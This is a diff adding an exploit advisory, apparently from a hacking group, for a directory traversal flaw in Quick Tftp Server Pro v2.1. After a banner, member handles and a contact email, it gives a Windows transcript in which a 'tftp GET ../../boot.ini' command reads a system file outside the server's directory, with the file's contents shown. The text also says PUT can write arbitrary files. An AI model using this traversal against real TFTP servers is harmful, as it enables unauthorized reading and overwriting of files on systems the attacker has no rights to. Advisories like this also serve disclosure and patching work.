@@ -1,0 +1,67 @@
+#     _             ____  __            __    ___ 
+#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
+#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
+#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
+# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
+#                   Live by the byte     |_/_/  
+#
+# Members:
+#
+# Pr0T3cT10n
+# -=M.o.B.=-
+# TheLeader
+# Sro
+# Debug
+#
+# Contact: inv0ked.israel@gmail.com
+#
+# -----------------------------------
+# Quick Tftp Server Pro is vulnerable for a path traversal, the following will explain you how to read & write files
+# The vulnerability allows an unprivileged attacker to read & write files whom he has no permissions to.
+# The vulnerable FTP command are:
+# * GET 	- Read 	File
+# * PUT 	- Write File
+#-----------------------------------
+# Vulnerability Title: Quick Tftp Server Pro v2.1 Remote Directory Traversal Vulnerability
+# Date: 05/11/2010
+# Author: Pr0T3cT10n
+# Software Link: http://www.tallsoft.com/tftpserver_setup.exe
+# Affected Version: 2.1
+# Tested on Windows XP Hebrew, Service Pack 3
+# ISRAEL, NULLBYTE.ORG.IL
+###
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Admin>tftp
+
+Transfers files to and from a remote computer running the TFTP service.
+
+TFTP [-i] host [GET | PUT] source [destination]
+
+  -i              Specifies binary image transfer mode (also called
+                  octet). In binary image mode the file is moved
+                  literally, byte by byte. Use this mode when
+                  transferring binary files.
+  host            Specifies the local or remote host.
+  GET             Transfers the file destination on the remote host to
+                  the file source on the local host.
+  PUT             Transfers the file source on the local host to
+                  the file destination on the remote host.
+  source          Specifies the file to transfer.
+  destination     Specifies where to transfer the file.
+
+
+C:\Documents and Settings\Admin>tftp -i 127.0.0.1 GET ../../boot.ini C:\boot.txt
+
+Transfer successful: 206 bytes in 1 second, 206 bytes/s
+
+C:\Documents and Settings\Admin>type c:\boot.txt
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional"
+/noexecute=optin /fastdetect
+
+C:\Documents and Settings\Admin>
